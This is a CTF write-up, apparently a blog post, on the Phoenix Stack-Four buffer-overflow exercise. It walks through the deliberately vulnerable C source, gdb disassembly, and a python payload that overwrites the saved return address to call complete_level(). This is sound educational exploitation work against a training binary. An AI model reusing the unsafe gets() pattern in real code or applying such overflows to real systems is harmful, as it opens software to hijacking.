---
title: Phoenix Stack-Four
author: Marius Kimmina
date: 2019-11-03 14:10:00 +0800
categories: [CTF, Binary Exploitation]
tags: [Buffer Overflow]
published: true
---

### 0x0. Introduction
For a full introduction to this series and setup description please look at the first post (Phoenix Stack-Zero and One).
In the last level of this series we had to overwrite a function pointer to execute a Function that would otherwise never get 
executed. This time the instruction pointer has been saved and we can use that to overwrite the return pointer.

### 0x1 taking a look at the source code

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```


Our goal here is to change the return pointer so that start_level() "returns" to complete_level() instead of main().
Normally a Function call works like this: The address, of the next instruction after the function call, gets saved to memory.
Then the instruction pointer gets overwritten with the address of the function, once it's finished executing the instruction
pointer gets overwritten again with the previously saved return address.

We can see this behavior in this program easily, since it prints out the return address for us.
First lets have a look at main() in assembler

```
Dump of assembler code for function main:
   0x000000000040066a <+0>:	push   rbp
   0x000000000040066b <+1>:	mov    rbp,rsp
   0x000000000040066e <+4>:	sub    rsp,0x10
   0x0000000000400672 <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400675 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400679 <+15>:	mov    edi,0x400750
   0x000000000040067e <+20>:	call   0x400480 <puts@plt>
   0x0000000000400683 <+25>:	mov    eax,0x0
   0x0000000000400688 <+30>:	call   0x400635 <start_level>
   0x000000000040068d <+35>:	mov    eax,0x0
   0x0000000000400692 <+40>:	leave  
   0x0000000000400693 <+41>:	ret    
End of assembler dump.
```

You can see that at address 0x0000000000400688 we are calling start_level(). So our return address should be 0x000000000040068d.
Time to run the program and find out:

```
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
A
and will be returning to 0x40068d
```

So yes we are indeed correct.


### 0x2 Exploiting the program

First I wanted to know where our return pointer is being saved, to do that i started with a look at start_level() in assembler code

```
(gdb) disassemble start_level
Dump of assembler code for function start_level:
   0x0000000000400635 <+0>:	push   rbp
   0x0000000000400636 <+1>:	mov    rbp,rsp
   0x0000000000400639 <+4>:	sub    rsp,0x50
   0x000000000040063d <+8>:	lea    rax,[rbp-0x50]
   0x0000000000400641 <+12>:	mov    rdi,rax
   0x0000000000400644 <+15>:	call   0x400470 <gets@plt>
   0x0000000000400649 <+20>:	mov    rax,QWORD PTR [rbp+0x8]
   0x000000000040064d <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400651 <+28>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400655 <+32>:	mov    rsi,rax
   0x0000000000400658 <+35>:	mov    edi,0x400733
   0x000000000040065d <+40>:	mov    eax,0x0
   0x0000000000400662 <+45>:	call   0x400460 <printf@plt>
   0x0000000000400667 <+50>:	nop
   0x0000000000400668 <+51>:	leave  
   0x0000000000400669 <+52>:	ret    
End of assembler dump.
```

We can easily identify the calls for gets() and printf() so the answer had to be somewhere in between
So i decided so set a breakpoint at printf() hope to find our return address.
```
(gdb) break *0x0000000000400662
```

Upon hitting the breakpoint and looking at the register values we see:

```
$rax   : 0x000000000040068d  →  <main+35> mov eax, 0x0
```

so rax is holding the return pointer.  
Now that we know that lets get started on the bufferoverflow, as always I'm using the alphabet for a pretty easily recognizable pattern.
```
Welcome to phoenix/stack-four, brought to you by https://exploit.education
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZ
```

And once we hit our breakpoint again we will see that rax is now:
```
$rax   : 0x5858585857575757 ("WWWWXXXX"?)
```

So we have to replace the Ws and Xs in our payload with the address of complete_level(), which we can find out easily in gdb for example 
with "disassemble complete_level". Look at the first address in the disassembled code and that's were we want to return to.
In our case its: 40061d

A pretty easy way to input this address is to decode it with python:

```
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV' + ('1d0640').decode('hex')" | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

Yet again keep in mind that this little endian thus "40061d" becomes "1d0640", byte by byte from right to left.




/
